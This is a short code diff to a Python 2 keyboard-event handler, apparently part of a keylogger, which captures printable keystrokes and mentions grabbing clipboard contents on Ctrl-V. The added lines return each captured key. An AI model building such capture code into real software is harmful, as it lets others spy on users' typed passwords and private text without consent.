@@ -52,6 +52,8 @@ def run(**args):
 
 		# if they pressed a standard key
 		if event.Ascii > 32 and event.Ascii < 127:
+			key = chr(event.Ascii)
+			return str(key)
 			print chr(event.Ascii),
 		else:
 			# if [Ctril-V], get the value on clipboard
